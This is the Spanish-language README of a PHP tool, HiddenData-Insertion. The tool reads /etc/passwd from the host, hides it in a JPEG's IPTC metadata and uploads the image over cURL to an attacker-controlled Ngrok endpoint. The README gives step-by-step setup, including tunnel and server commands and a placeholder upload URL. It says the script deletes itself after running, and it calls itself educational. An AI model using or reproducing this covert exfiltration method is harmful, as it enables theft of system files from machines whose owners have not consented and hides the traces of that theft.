HiddenData-Insertion es una herramienta que permite ocultar información sensible dentro de los metadatos IPTC de una imagen JPG y luego enviarla a un servidor remoto. Este script PHP es útil para demostrar cómo se puede ocultar información dentro de las imágenes de forma no visible y pasar potencialmente desapercibido.

## Características

- Ocultar información sensible dentro de los metadatos IPTC de una imagen JPEG.
- Enviar la imagen con los datos ocultos a un servidor remoto utilizando cURL.
- Utilizar la función `iptcembed` de PHP para incrustar datos en la imagen.

## Requisitos

- PHP 5.6 o superior
- Extensiones PHP `gd` y `curl` habilitadas

## Uso

1. **Configurar el servidor Ngrok:**
   - Descarga e instala Ngrok desde [aquí](https://ngrok.com/).
   - Inicia Ngrok para crear un túnel público a tu servidor local:
     ```
     ngrok http 80
     ```
   - Copie la URL pública proporcionada por Ngrok.

2. **Configurar el script PHP**
   - Abra el archivo `HiddenData-Insertion.php` en un editor de texto.
   - Sustituye la variable `$ngrok_url` por la URL pública de tu servidor Ngrok.
     ```php
     $ngrok_url = 'https://<YOUR_NGROK_URL>.ngrok-free.app/upload.php';
     ```

3. **Ejecutar script PHP:**
   - Ejecutar el servidor PHP desde la misma ubicación donde se encuentra el archivo, `upload.php`.
     ```sh
     php -S 0.0.0.0:80
     ```

4. **Ejecute el script PHP HiddenData-Insertion.php:**
   - Subiéndolo a una web: Cargue el archivo HiddenData-Insertion.php en un servidor web y luego acceda a él a través de un navegador web. Por ejemplo, si el archivo se encuentra en http://tu-servidor.com/HiddenData-Insertion.php, puede acceder escribiendo esa dirección en la barra de direcciones de su navegador.
   - A través de la línea de comandos: Ejecute el script directamente desde la terminal o símbolo del sistema. Para ello, acceda al directorio donde se encuentra el archivo HiddenData-Insertion.php y ejecute el siguiente comando:
     ```php
     php HiddenData-Insertion.php
     ```

   - El script generará una imagen aleatoria y ocultará el contenido del archivo `/etc/passwd` dentro de los metadatos IPTC de la imagen.
   - La imagen se enviará al servidor Ngrok configurado.

6. **Verificar la recepción:**
   - Asegúrese de que su servidor configurado con Ngrok está preparado para recibir y gestionar el fichero enviado.
   - Después de ejecutar el script, puede verificar el archivo de imagen resultante y ver los metadatos IPTC ocultos utilizando la herramienta exiftool. Por ejemplo:
     ```php
     exiftool passwd.jpg
     ```

Este script es sólo para fines educativos, después de ejecutar el script recuerde que se borrará automáticamente.
